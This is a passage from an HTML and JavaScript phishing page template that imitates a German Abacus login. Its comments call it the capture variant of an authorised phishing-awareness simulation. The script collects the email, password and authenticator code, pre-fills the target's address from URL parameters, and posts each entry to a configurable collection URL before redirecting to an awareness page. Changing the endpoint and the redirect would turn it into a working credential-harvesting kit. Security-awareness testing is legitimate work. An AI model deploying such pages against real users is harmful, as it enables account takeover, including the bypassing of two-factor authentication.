  <div class="aba-card" data-step="email">
    <form id="step-email" autocomplete="off">
      <div class="aba-card-title">Bitte melden Sie sich bei Abacus an</div>
      <label class="aba-label" for="aba-user">Benutzername / E-Mail</label>
      <input type="email" name="email" id="aba-user" class="aba-field" placeholder="vorname.nachname@firma.ch" required autofocus>
      <div class="aba-row">
        <a class="aba-link" href="#">Passwort vergessen?</a>
        <button type="submit" class="aba-btn">Weiter</button>
      </div>
    </form>

    <form id="step-password" autocomplete="off" style="display:none">
      <div class="aba-card-title">Passwort eingeben</div>
      <div class="aba-account"><span class="aba-account-dot"></span><span id="email-echo">user@example.com</span></div>
      <label class="aba-label" for="aba-pwd">Passwort</label>
      <input type="password" name="password" id="aba-pwd" class="aba-field" placeholder="Passwort" required>
      <div class="aba-row">
        <a class="aba-link" href="#">Passwort vergessen?</a>
        <button type="submit" class="aba-btn">Anmelden</button>
      </div>
    </form>

    <form id="step-2fa" autocomplete="off" style="display:none">
      <div class="aba-card-title">Bestätigen Sie Ihre Identität</div>
      <div class="aba-account"><span class="aba-account-dot"></span><span id="email-echo-2">user@example.com</span></div>
      <p class="aba-sub">Geben Sie den Code aus Ihrer Authenticator-App ein.</p>
      <label class="aba-label" for="aba-code">Bestätigungscode</label>
      <input type="text" name="code_2fa" id="aba-code" class="aba-field aba-code" inputmode="numeric" pattern="[0-9]{4,8}" maxlength="8" placeholder="000000" required>
      <div class="aba-row aba-row-end">
        <button type="submit" class="aba-btn">Bestätigen</button>
      </div>
    </form>
  </div>

  <div class="aba-footer">
    <span class="aba-footer-news">&#9993;&#65039; Newsletter abonnieren</span>
    <span class="aba-footer-lang">Deutsch</span>
  </div>
</div>

<script data-tracker src="{{TRACKER_URL_ATTR}}"></script>
<script>
(function () {
  // CAPTURE variant (authorised simulation): records email + password (+ OTP
  // when enabled) to the tracker, then redirects to a built-in awareness page
  // (learn.html) — "Ooops, du wurdest gephisht" — instead of the real login.
  //
  // URL params (set by the phishing mail's CTA):
  //   rid / trackerId  — tracker context (also read from window.__taphish_tracker)
  //   email | login_hint — pre-fills the account and jumps straight to the
  //                        password step, mirroring M365's real login_hint flow
  //   mfa=0            — skip the OTP step for this campaign (default: keep OTP)
  var POST_URL = "{{POST_URL}}";
  var Q = new URLSearchParams(location.search);
  var prefillEmail = (Q.get("email") || Q.get("login_hint") || "").trim();
  var captureMfa   = Q.get("mfa") !== "0"; // OTP step on by default; mfa=0 disables
  function trackerCtx() {
    var t = window.__taphish_tracker || {};
    return { rid: t.rid || Q.get("rid") || "", sess_id: t.session_id || Q.get("sess_id") || "", trackerId: t.tracker_id || Q.get("trackerId") || "" };
  }
  function post(payload, cb) {
    if (!POST_URL) { cb(); return; }
    fetch(POST_URL, { method: "POST", mode: "cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(cb, cb);
  }
  var formEmail = document.getElementById("step-email");
  var formPwd   = document.getElementById("step-password");
  var form2fa   = document.getElementById("step-2fa");
  var emailVal = "", pwdVal = "";

  function echoEmail() {
    document.getElementById("email-echo").textContent = emailVal;
    document.getElementById("email-echo-2").textContent = emailVal;
  }
  function gotoPwd() { echoEmail(); formEmail.style.display = "none"; formPwd.style.display = "block"; }
  function redirectAware(ctx) {
    var rid = ctx.rid ? ("?rid=" + encodeURIComponent(ctx.rid)) : "";
    setTimeout(function () { location.href = "learn.html" + rid; }, 250);
  }

  formEmail.addEventListener("submit", function (e) {
    e.preventDefault();
    emailVal = formEmail.elements["email"].value;
    var ctx = trackerCtx();
    post({ page: 1, form_field_data: { email: emailVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { gotoPwd(); });
  });
  formPwd.addEventListener("submit", function (e) {
    e.preventDefault();
    pwdVal = formPwd.elements["password"].value;
    var ctx = trackerCtx();
    post({ page: 2, form_field_data: { email: emailVal, password: pwdVal }, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () {
      if (captureMfa) { formPwd.style.display = "none"; form2fa.style.display = "block"; }
      else { redirectAware(ctx); }
    });
  });
  form2fa.addEventListener("submit", function (e) {
    e.preventDefault();
    var code = form2fa.elements["code_2fa"].value;
    var ctx = trackerCtx();
    post({ page: 3, form_field_data: { email: emailVal, password: pwdVal }, code_2fa: code, rid: ctx.rid, sess_id: ctx.sess_id, trackerId: ctx.trackerId }, function () { redirectAware(ctx); });
  });

  // Pre-fill the username field (editable), exactly like M365's login_hint: the
  // normal email -> Next -> password flow is preserved, the address is just
  // seeded into the field. The recipient still sees and can edit it.
  if (prefillEmail && formEmail.elements["email"]) {
    formEmail.elements["email"].value = prefillEmail;
  }
})();
</script>
</body>
